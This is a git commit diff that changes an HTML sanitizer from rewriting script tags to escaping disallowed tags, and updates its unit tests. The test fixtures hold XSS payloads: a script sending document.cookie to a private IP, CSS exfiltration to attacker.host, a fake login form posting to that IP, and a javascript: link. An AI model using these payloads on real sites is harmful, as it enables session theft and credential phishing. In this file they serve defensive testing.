b089c75e9ea6af14918e3eca512d89f566e548a0
mmckenna <mmckenna.phila@gmail.com>
2019-05-15 16:30:00 -0400

    patches sanitize-html to escape blacklisted tags

--- src/utilities/sanitize-html/sanitize-html.test.ts
+++ src/utilities/sanitize-html/sanitize-html.test.ts
@@ -4,51 +4,54 @@ import { sanitizeHTML } from './sanitizeHTML';
 const script = '<script src=""></script>';
 const script2 = `<script>new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;</script>`;
 const xhrScript = `<script>
-var xhr = new XMLHttpRequest();
-xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
-xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
-xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
-</script>`;
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
+  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+  xhr.send('txtName=xss&mtxMessage=xss&btnSign=Sign+Guestbook');
+  </script>`;
 const aClick = '<a onClick="() => console.log("hello world")"></a>';
 const aClickLang =
   '<a lang="en-us" onClick="() => console.log("hello world")"></a>';
 const css = `<style>#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}</style><input id="username" value="mikeg" />`;
 const login = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> <form action=http://192.168.149.128>Username:<br><input type="username" name="username"></br>Password:<br><input type="password" name="password"></br><br><input type="submit" value="Logon"></br>`;
-const aScript = `a href="javascript:alert(8007)">Click me</a>`;
+const aScript = `<a href="javascript:alert(8007)">Click me</a>`;
 const queryString = `http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<script src="http://192.168.149.128/xss.js">`;
 
 /** allowed */
 const a = '<a href="helloworld.com">Hello world</a>';
 const aLang = '<a lang="en-us"></a>';
 
-it('should render script tags as text inside a p tag', () => {
-  expect(sanitizeHTML(script)).toBe(
-    '<p>&lt;script src=&gt;&lt;/script&gt;</p>'
-  );
+it('should escape script tags, retain child text, and strip attributes', () => {
+  expect(sanitizeHTML(script)).toBe('&lt;script&gt;&lt;/script&gt;');
   expect(sanitizeHTML(script2)).toBe(
-    '<p>&lt;script&gt;&lt;/script&gt;&lt;script&gt;&lt;/script&gt;</p>'
+    '&lt;script&gt;new Image().src="http://192.168.149.128/bogus.php?output="+document.cookie;&lt;/script&gt;'
   );
   expect(sanitizeHTML(xhrScript)).toBe(
-    '<p>&lt;script&gt;&lt;/script&gt;&lt;script&gt;&lt;/script&gt;</p>'
+    `&lt;script&gt;
+  var xhr = new XMLHttpRequest();
+  xhr.open('POST','http://localhost:81/DVWA/vulnerabilities/xss_s/',true);
+  xhr.setRequestHeader('Content-type','application/x-www-form-urlencoded');
+  xhr.send('txtName=xss&amp;mtxMessage=xss&amp;btnSign=Sign+Guestbook');
+  &lt;/script&gt;`
   );
 });
 
-it('should remove unwanted blacklisted tags', () => {
+it('should escape unwanted blacklisted tags', () => {
   expect(sanitizeHTML(login)).toBe(
-    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<h3>Please login to proceed</h3> Username:<br /><br />Password:<br /><br /><br /><br />'
+    '<form>Username:<br />&lt;input /&gt;<br />Password:<br />&lt;input /&gt;<br /><br />&lt;input /&gt;<br /></form>'
   );
-  expect(sanitizeHTML(aScript)).toBe(
-    `a href=\"javascript:alert(8007)\"&gt;Click me`
-  );
+  expect(sanitizeHTML(aScript)).toBe(`<a>Click me</a>`);
 });
 
-it('should not allow CSS attacks', () => {
-  expect(sanitizeHTML(css)).toBe('');
+it('should not allow CSS attacks by escaping the style tag', () => {
+  expect(sanitizeHTML(css)).toBe(
+    '&lt;style&gt;#username[value="mikeg"] {background:url("https://attacker.host/mikeg");}&lt;/style&gt;&lt;input /&gt;'
+  );
 });
 
 it('should not allow query string attacks', () => {
   expect(sanitizeHTML(queryString)).toBe(
-    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=<p>&lt;script src=http://192.168.149.128/xss.js&gt;&lt;/script&gt;</p>'
+    'http://localhost:81/DVWA/vulnerabilities/xss_r/?name=&lt;script&gt;&lt;/script&gt;'
   );
 });
 
--- src/utilities/sanitize-html/sanitizeHTML.ts
+++ src/utilities/sanitize-html/sanitizeHTML.ts
@@ -3,23 +3,34 @@ import { allowedHTMLAttr, allowedHTMLTags } from 'src/constants';
 
 export const sanitizeHTML = (text: string) =>
   sanitize(text, {
-    allowedTags: [...allowedHTMLTags, 'script'],
+    allowedTags: allowedHTMLTags,
     allowedAttributes: {
       '*': allowedHTMLAttr,
       /** only allowing classes on spans for the sole purpose of code highlighting */
       span: ['class']
     },
+    /**
+     * this option is not supported and was patched
+     * See: https://github.com/punkave/sanitize-html/pull/169
+     */
+    escapeDisallowedTags: true
     /** this is basically just converting script tags to text */
-    transformTags: {
-      script: (tagName, attrs: Record<string, string>) => {
-        const attrsAsString = Object.keys(attrs).reduce((accum, eachKey) => {
-          return `${accum} ${eachKey}=${attrs[eachKey]}`;
-        }, '');
-        return {
-          tagName: 'p',
-          text: `&lt;${tagName}${attrsAsString}&gt;&lt;/${tagName}&gt;`,
-          attribs: {}
-        };
-      }
-    }
+    // transformTags: {
+    //   script: (tagName, attrs: Record<string, string>) => {
+    //     /**
+    //      * get all attributes of the script tag and recreate them as they were typed
+    //      * i.e src="hello.js"
+    //      */
+    //     const attrsAsString = Object.keys(attrs).reduce((accum, eachKey) => {
+    //       return `${accum} ${eachKey}="${attrs[eachKey]}"`;
+    //     }, '');
+
+    //     /** return the script tag as text inside a p tag */
+    //     return {
+    //       tagName: 'script',
+    //       text: `&lt;${tagName}${attrsAsString}&gt;&lt;/${tagName}&gt;`,
+    //       attribs: {}
+    //     };
+    //   }
+    // }
   }).trim();
